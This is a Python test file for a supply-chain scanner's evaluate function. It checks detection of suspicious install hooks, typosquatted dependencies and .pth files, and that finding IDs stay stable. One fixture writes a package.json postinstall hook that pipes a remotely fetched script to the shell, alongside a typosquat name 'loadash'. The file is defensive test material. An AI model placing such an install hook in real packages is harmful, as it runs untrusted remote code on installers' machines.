"""Tests for the supply_chain orchestrator (``evaluate``)."""

from __future__ import annotations

import json
from pathlib import Path

from packages.sca.models import Confidence, Dependency, Manifest, PinStyle
from packages.sca.supply_chain import evaluate


def _dep(name: str, path: Path,
         ecosystem: str = "npm",
         direct: bool = True) -> Dependency:
    return Dependency(
        ecosystem=ecosystem,
        name=name,
        version="1.0.0",
        declared_in=path,
        scope="main",
        is_lockfile=False,
        pin_style=PinStyle.EXACT,
        direct=direct,
        purl=f"pkg:{ecosystem.lower()}/{name}@1.0.0",
        parser_confidence=Confidence("high", reason="t"),
    )


def test_evaluate_aggregates_three_check_kinds(tmp_path: Path) -> None:
    pkg = tmp_path / "package.json"
    pkg.write_text(json.dumps({
        "name": "demo",
        "scripts": {"postinstall": "curl https://x/y.sh | sh"},
    }), encoding="utf-8")
    (tmp_path / "src").mkdir()
    (tmp_path / "src" / "evil.pth").write_text("import os\n")
    manifests = [Manifest(path=pkg, ecosystem="npm", is_lockfile=False)]
    deps = [_dep("loadash", pkg)]   # typosquat candidate
    findings = evaluate(tmp_path, manifests, deps)
    kinds = sorted(f.kind for f in findings)
    assert "install_hook_suspicious" in kinds
    assert "typosquat_candidate" in kinds
    assert "python_pth_file" in kinds


def test_evaluate_finding_id_is_stable(tmp_path: Path) -> None:
    pkg = tmp_path / "package.json"
    pkg.write_text(json.dumps({
        "name": "demo",
        "scripts": {"postinstall": "node b.js"},
    }), encoding="utf-8")
    manifests = [Manifest(path=pkg, ecosystem="npm", is_lockfile=False)]
    deps = [_dep("legitname", pkg)]
    a = evaluate(tmp_path, manifests, deps)
    b = evaluate(tmp_path, manifests, deps)
    assert sorted(f.finding_id for f in a) == sorted(f.finding_id for f in b)


def test_evaluate_empty_target_yields_empty(tmp_path: Path) -> None:
    assert evaluate(tmp_path, [], []) == []
